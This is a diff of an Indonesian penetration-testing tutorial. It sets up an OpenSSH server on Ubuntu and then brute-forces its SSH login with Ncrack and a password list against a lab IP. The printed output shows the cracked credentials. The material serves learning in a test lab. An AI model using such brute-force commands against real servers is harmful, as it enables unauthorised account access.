@@ -52,16 +52,47 @@ Software Ncrack adalah ...
 
 * Untuk mengintall openSSH di OS Ubuntu server ketik 
 
-...
-    ~$ sudo apt-get update && apt-get install openssh-server
-...
+```
+~$ sudo apt-get update && apt-get install openssh-server
+```
 
-* masukkan password server. kemudian klik enter.
+* Masukkan password server. kemudian klik enter.
+* Tunggu sampai proses download dan instalisasi selesai
+* Kemudian jalankan *openssh-server*
+
+```
+~$ sudo systemctl start sshd.service
+```
+
 
 ### Uji penetrasi menggunakan Ncrack
 
-* -
-* -
+* Di OS kali linux sudah tersedia tool ncrack untuk memenetrasi ssh server
+* syntax ncrack adalah
+
+```
+~$ ncrack [Option] (target and service specification)
+```
+
+* Untuk melakukan uji penetrasi pada server uji coba, kita perlu mengetahui IPnya. di sini sudah diketahui IP server target adalah 192.168.145.132.
+
+```
+~$ ncrack -p 22 -user ggg -P password-lib-list.txt 192.168.145.132
+
+Starting Ncrack 0.4ALPHA ( http://ncrack.org ) at 2016-07-01 23:21 WIB
+
+Discovered credentials for ssh on 192.168.145.132 22/tcp:
+192.168.145.132 22/tcp ss: 'ggg' 'ggg'
+
+Ncrack done:1 service scanner in 24.14 seconds.
+
+Ncrack finished.
+```
+
+* dari penetrasi di atas diketahui bahwa server dengan nama 'ggg' memiliki password 'ggg'
+
+
+* 
 
 ## Uji Penetrasi 2
 
